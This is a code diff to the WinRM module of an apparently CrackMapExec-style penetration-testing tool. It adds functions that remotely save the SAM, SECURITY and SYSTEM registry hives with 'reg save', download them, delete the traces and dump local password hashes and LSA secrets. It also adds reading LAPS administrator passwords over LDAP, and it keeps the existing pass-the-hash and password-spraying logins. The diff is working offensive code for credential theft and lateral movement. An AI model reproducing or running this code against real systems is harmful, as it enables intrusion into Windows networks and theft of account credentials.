@@ -6,9 +6,11 @@ from impacket.smbconnection import SMBConnection, SessionError
 from cme.connection import *
 from cme.helpers.logger import highlight
 from cme.helpers.bloodhound import add_user_bh
+from cme.protocols.ldap.smbldap import LDAPConnect
 from cme.logger import CMEAdapter
 from io import StringIO
 from pypsrp.client import Client
+from impacket.examples.secretsdump import LocalOperations, LSASecrets
 
 # The following disables the InsecureRequests warning and the 'Starting new HTTPS connection' log message
 from requests.packages.urllib3.exceptions import InsecureRequestWarning
@@ -24,6 +26,7 @@ class winrm(connection):
     def __init__(self, args, db, host):
         self.domain = None
         self.server_os = None
+        self.output_filename = None
 
         connection.__init__(self, args, db, host)
 
@@ -34,9 +37,17 @@ class winrm(connection):
         winrm_parser.add_argument("--no-bruteforce", action='store_true', help='No spray when using file for username and password (user1 => password1, user2 => password2')
         winrm_parser.add_argument("--continue-on-success", action='store_true', help="continues authentication attempts even after successes")
         winrm_parser.add_argument("--port", type=int, default=0, help="Custom WinRM port")
+        winrm_parser.add_argument("--ssl", action='store_true', help="Connect to SSL Enabled WINRM")
+        winrm_parser.add_argument("--ignore-ssl-cert", action='store_true', help="Ignore Certificate Verification")
+        winrm_parser.add_argument("--laps", dest='laps', metavar="LAPS", type=str, help="LAPS authentification", nargs='?', const='administrator')
         dgroup = winrm_parser.add_mutually_exclusive_group()
         dgroup.add_argument("-d", metavar="DOMAIN", dest='domain', type=str, default=None, help="domain to authenticate to")
         dgroup.add_argument("--local-auth", action='store_true', help='authenticate locally to each target')
+
+        cgroup = winrm_parser.add_argument_group("Credential Gathering", "Options for gathering credentials")
+        cegroup = cgroup.add_mutually_exclusive_group()
+        cegroup.add_argument("--sam", action='store_true', help='dump SAM hashes from target systems')
+        cegroup.add_argument("--lsa", action='store_true', help='dump LSA secrets from target systems')
 
         cgroup = winrm_parser.add_argument_group("Command Execution", "Options for executing commands")
         cgroup.add_argument('--no-output', action='store_true', help='do not retrieve command output')
@@ -49,12 +60,12 @@ class winrm(connection):
         self.proto_logger()
         if self.create_conn_obj():
             self.enum_host_info()
-            self.print_host_info()
-            if self.login():
-                if hasattr(self.args, 'module') and self.args.module:
-                    self.call_modules()
-                else:
-                    self.call_cmd_args()
+            if self.print_host_info():
+                if self.login():
+                    if hasattr(self.args, 'module') and self.args.module:
+                        self.call_modules()
+                    else:
+                        self.call_cmd_args()
 
     def proto_logger(self):
         self.logger = CMEAdapter(extra={'protocol': 'SMB',
@@ -73,13 +84,14 @@ class winrm(connection):
                 try:
                     smb_conn.login('', '')
                 except SessionError as e:
-                    if "STATUS_ACCESS_DENIED" in e.message:
-                        pass
+                    pass
 
                 self.domain = smb_conn.getServerDNSDomainName()
                 self.hostname = smb_conn.getServerName()
                 self.server_os = smb_conn.getServerOS()
                 self.logger.extra['hostname'] = self.hostname
+
+                self.output_filename = os.path.expanduser('~/.cme/logs/{}_{}_{}'.format(self.hostname, self.host, datetime.now().strftime("%Y-%m-%d_%H%M%S")))
 
                 try:
                     smb_conn.logoff()
@@ -95,6 +107,40 @@ class winrm(connection):
             if self.args.local_auth:
                 self.domain = self.hostname
 
+    def laps_search(self, username, password, ntlm_hash, domain):
+        ldapco = LDAPConnect(self.domain, "389", self.domain)
+        connection = ldapco.plaintext_login(domain, username[0] if username else '', password[0] if password else '', ntlm_hash[0] if ntlm_hash else '' )
+        if connection == False:
+            logging.debug('LAPS connection failed with account {}'.format(username))
+            return False
+        searchFilter = '(&(objectCategory=computer)(ms-MCS-AdmPwd=*)(name='+ self.hostname +'))'
+        attributes = ['ms-MCS-AdmPwd','samAccountname']
+        result = connection.search(searchFilter=searchFilter,
+                                                attributes=attributes,
+                                                sizeLimit=0)
+
+        msMCSAdmPwd = ''
+        sAMAccountName = ''
+        for item in result:
+            if isinstance(item, ldapasn1_impacket.SearchResultEntry) is not True:
+                continue
+            for computer in item['attributes']:
+                if str(computer['type']) == "sAMAccountName":
+                    sAMAccountName = str(computer['vals'][0])
+                else:
+                    msMCSAdmPwd = str(computer['vals'][0])
+            logging.debug("Computer: {:<20} Password: {} {}".format(sAMAccountName, msMCSAdmPwd, self.hostname))
+        self.username = self.args.laps
+        self.password = msMCSAdmPwd
+        if msMCSAdmPwd == '':
+            logging.debug('msMCSAdmPwd is empty, account cannot read LAPS property for {}'.format(self.hostname))
+            return False
+        if ntlm_hash:
+            hash_ntlm = hashlib.new('md4', msMCSAdmPwd.encode('utf-16le')).digest()
+            self.hash = binascii.hexlify(hash_ntlm).decode()
+        self.domain = self.hostname
+        return True
+
     def print_host_info(self):
         if self.args.domain:
             self.logger.extra['protocol'] = "HTTP"
@@ -107,6 +153,9 @@ class winrm(connection):
             self.logger.extra['protocol'] = "HTTP"
             self.logger.info(self.endpoint)
         self.logger.extra['protocol'] = "WINRM"
+        if self.args.laps:
+            return self.laps_search(self.args.username, self.args.password, self.args.hash, self.domain)
+        return True
         
 
     def create_conn_obj(self):
@@ -138,10 +187,28 @@ class winrm(connection):
         try:
             from urllib3.connectionpool import log
             log.addFilter(SuppressFilter())
-            self.conn = Client(self.host,
+            if not self.args.laps:
+                self.password = password
+                self.username = username
+            self.domain = domain
+            if self.args.ssl and self.args.ignore_ssl_cert:
+                self.conn = Client(self.host,
                                         auth='ntlm',
-                                        username=u'{}\\{}'.format(domain, username),
-                                        password=password,
+                                        username=u'{}\\{}'.format(domain, self.username),
+                                        password=self.password,
+                                        ssl=True,
+                                        cert_validation=False)
+            elif self.args.ssl:
+                self.conn = Client(self.host,
+                                        auth='ntlm',
+                                        username=u'{}\\{}'.format(domain, self.username),
+                                        password=self.password,
+                                        ssl=True)
+            else:
+                self.conn = Client(self.host,
+                                        auth='ntlm',
+                                        username=u'{}\\{}'.format(domain, self.username),
+                                        password=self.password,
                                         ssl=False)
 
             # TO DO: right now we're just running the hostname command to make the winrm library auth to the server
@@ -149,22 +216,23 @@ class winrm(connection):
             self.conn.execute_ps("hostname")
             self.admin_privs = True
             self.logger.success(u'{}\\{}:{} {}'.format(self.domain,
-                                                       username,
-                                                       password,
+                                                       self.username,
+                                                       self.password if not self.config.get('CME', 'audit_mode') else self.config.get('CME', 'audit_mode')*8,
                                                        highlight('({})'.format(self.config.get('CME', 'pwn3d_label')) if self.admin_privs else '')))
-            add_user_bh(self.username, self.domain, self.logger, self.config) 
+            if not self.args.local_auth:
+                add_user_bh(self.username, self.domain, self.logger, self.config) 
             if not self.args.continue_on_success:
                 return True
 
         except Exception as e:
             if "with ntlm" in str(e): 
                 self.logger.error(u'{}\\{}:{}'.format(self.domain,
-                                                        username,
-                                                        password))
+                                                        self.username,
+                                                        self.password if not self.config.get('CME', 'audit_mode') else self.config.get('CME', 'audit_mode')*8))
             else:
                 self.logger.error(u'{}\\{}:{} "{}"'.format(self.domain,
-                                                        username,
-                                                        password,
+                                                        self.username,
+                                                        self.password if not self.config.get('CME', 'audit_mode') else self.config.get('CME', 'audit_mode')*8,
                                                         e))
 
             return False
@@ -176,20 +244,38 @@ class winrm(connection):
             lmhash = '00000000000000000000000000000000:'
             nthash = ''
 
-            #This checks to see if we didn't provide the LM Hash
-            if ntlm_hash.find(':') != -1:
-                lmhash, nthash = ntlm_hash.split(':')
+            if not self.args.laps:
+                self.username = username
+                #This checks to see if we didn't provide the LM Hash
+                if ntlm_hash.find(':') != -1:
+                    lmhash, nthash = ntlm_hash.split(':')
+                else:
+                    nthash = ntlm_hash
+                    ntlm_hash = lmhash + nthash
+                if lmhash: self.lmhash = lmhash
+                if nthash: self.nthash = nthash
             else:
-                nthash = ntlm_hash
-                ntlm_hash = lmhash + nthash
-
-            self.hash = nthash
-            if lmhash: self.lmhash = lmhash
-            if nthash: self.nthash = nthash
-            self.conn = Client(self.host,
+                nthash = self.hash
+            
+            self.domain = domain
+            if self.args.ssl and self.args.ignore_ssl_cert:
+                self.conn = Client(self.host,
                                         auth='ntlm',
-                                        username=u'{}\\{}'.format(domain, username),
-                                        password=ntlm_hash,
+                                        username=u'{}\\{}'.format(self.domain, self.username),
+                                        password=lmhash + nthash,
+                                        ssl=True,
+                                        cert_validation=False)
+            elif self.args.ssl:
+                self.conn = Client(self.host,
+                                        auth='ntlm',
+                                        username=u'{}\\{}'.format(self.domain, self.username),
+                                        password=lmhash + nthash,
+                                        ssl=True)
+            else:
+                self.conn = Client(self.host,
+                                        auth='ntlm',
+                                        username=u'{}\\{}'.format(self.domain, self.username),
+                                        password=lmhash + nthash,
                                         ssl=False)
 
             # TO DO: right now we're just running the hostname command to make the winrm library auth to the server
@@ -197,22 +283,23 @@ class winrm(connection):
             self.conn.execute_ps("hostname")
             self.admin_privs = True
             self.logger.success(u'{}\\{}:{} {}'.format(self.domain,
-                                                       username,
-                                                       self.hash,
+                                                       self.username,
+                                                       nthash if not self.config.get('CME', 'audit_mode') else self.config.get('CME', 'audit_mode')*8,
                                                        highlight('({})'.format(self.config.get('CME', 'pwn3d_label')) if self.admin_privs else '')))
-            add_user_bh(self.username, self.domain, self.logger, self.config)
+            if not self.args.local_auth:
+                add_user_bh(self.username, self.domain, self.logger, self.config)
             if not self.args.continue_on_success:
                 return True
 
         except Exception as e:
             if "with ntlm" in str(e): 
                 self.logger.error(u'{}\\{}:{}'.format(self.domain,
-                                                        username,
-                                                        self.hash))
+                                                        self.username,
+                                                        nthash if not self.config.get('CME', 'audit_mode') else self.config.get('CME', 'audit_mode')*8))
             else:
                 self.logger.error(u'{}\\{}:{} "{}"'.format(self.domain,
-                                                        username,
-                                                        self.hash,
+                                                        self.username,
+                                                        nthash if not self.config.get('CME', 'audit_mode') else self.config.get('CME', 'audit_mode')*8,
                                                         e))
 
             return False
@@ -230,3 +317,29 @@ class winrm(connection):
         r = self.conn.execute_ps(self.args.ps_execute)
         self.logger.success('Executed command')
         self.logger.highlight(r[0])
+
+    def sam(self):
+        self.conn.execute_cmd("reg save HKLM\SAM C:\\windows\\temp\\SAM && reg save HKLM\SYSTEM C:\\windows\\temp\\SYSTEM")
+     
+        self.conn.fetch("C:\\windows\\temp\\SAM", self.output_filename + ".sam")
+        self.conn.fetch("C:\\windows\\temp\\SYSTEM", self.output_filename + ".system")
+        
+        self.conn.execute_cmd("del C:\\windows\\temp\\SAM && del C:\\windows\\temp\\SYSTEM")
+
+        localOperations = LocalOperations(self.output_filename + ".system")
+        bootKey = localOperations.getBootKey()
+        SAM = SAMHashes(self.output_filename + ".sam", bootKey, isRemote=None, perSecretCallback=lambda secret: self.logger.highlight(secret))
+        SAM.dump()
+        SAM.export(self.output_filename + ".sam")
+
+    def lsa(self):
+        self.conn.execute_cmd("reg save HKLM\SECURITY C:\\windows\\temp\\SECURITY && reg save HKLM\SYSTEM C:\\windows\\temp\\SYSTEM")
+        self.conn.fetch("C:\\windows\\temp\\SECURITY", self.output_filename + ".security")
+        self.conn.fetch("C:\\windows\\temp\\SYSTEM", self.output_filename + ".system")
+        self.conn.execute_cmd("del C:\\windows\\temp\\SYSTEM && del C:\\windows\\temp\\SECURITY")
+
+        localOperations = LocalOperations(self.output_filename + ".system")
+        bootKey = localOperations.getBootKey()
+        LSA = LSASecrets(self.output_filename + ".security", bootKey, None, isRemote=None, perSecretCallback=lambda secretType, secret: self.logger.highlight(secret))
+        LSA.dumpCachedHashes()
+        LSA.dumpSecrets()
